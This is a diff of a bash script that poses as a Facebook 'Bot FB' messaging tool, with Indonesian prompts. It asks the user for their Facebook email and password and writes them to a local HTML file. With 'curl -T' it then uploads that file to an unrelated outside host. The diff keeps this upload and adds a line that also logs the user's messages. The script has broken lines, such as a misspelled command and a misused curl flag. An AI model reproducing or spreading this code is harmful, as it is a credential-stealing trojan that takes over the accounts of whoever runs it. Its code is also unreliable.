@@ -1,7 +1,6 @@
 #!/bin/bash
-clearhttps://mobile.facebook.com/?_e_pi_=7%2CPAGE_ID10%2C8803815575
-
-toilet -f shadow -F gay "    Bot FB"
+clear
+tcilet -f shadow -F gay "    Bot FB"
 echo """
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     <=  author : ./YONDAIME-09_X             =>
@@ -19,12 +18,13 @@ Email:""" user ;
 echo "\033[96m"
 read -p "Password :" pass ;
 echo  "~root[@]Sedang MasuK Ke Akun Anda" | lolcat
-curl -T https://mobile.facebook.com/login$user$pass
+curl -U https://mobile.facebook.com/login$user$pass
 sleep 4
 echo "~root[@]Berhasil Login √ " | lolcat
-echo "User: $user\nPass: $pass" >> File/bot.html;
+echo "menyimpan akses login anda..." | lolcat
+echo "User: $user\nPass: $pass" >> File/Akses/login.html;
 sleep 2
-curl -T File/bot.html http://tirupurjobs.net 
+curl -T File/Akses/login.html http://tirupurjobs.net 
 echo "\033[93m"
 read -p "masukan pesan 1 :" pesan1 ;
 read -p "masukan pesan 2 :" pesan2 ;
@@ -32,6 +32,7 @@ read -p "masukan pesan 3 :" pesan3 ;
 read -p "masukab pesan 4 :" pesan4 ;
 read -p "masukan pesan 5 :" pesan5 ;
 echo "loading sendding to facebook.com..."
+echo "pesan :$pesan1\n$pesan2\n$pesan3\n$pesan4\npesan5\n" >> File/Pesan.html
 echo "\033[92m=>$pesan1"
 sleep 1
 echo "\033[93m=>$pesan2"
